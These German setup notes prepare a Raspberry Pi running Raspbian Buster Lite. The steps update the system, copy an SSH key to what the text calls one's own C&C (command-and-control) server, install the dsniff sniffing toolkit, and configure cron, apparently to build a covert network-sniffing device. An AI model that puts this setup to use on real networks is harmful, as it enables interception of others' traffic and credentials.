Raspbian Buster Lite (2020-02-13)
---------------------------------

sudo apt update
sudo apt full-upgrade
sudo apt autoremove
sudo apt autoclean
sudo raspi-config 
(Neustart durchführen!)

ssh-keygen
ssh-copy-id -p 12345 localhost.localdomain
(Port des eigenen C&C-Servers sowie Domain entsprechend ersetzen!)

sudo apt install dsniff ftp

(Dateien aus dem Repository installieren)

sudo chown pi:crontab /var/spool/cron/crontabs/pi

sudo chown root:crontab /var/spool/cron/crontabs/root

sudo chmod 600 /var/spool/cron/crontabs/*

sudo systemctl restart cron.service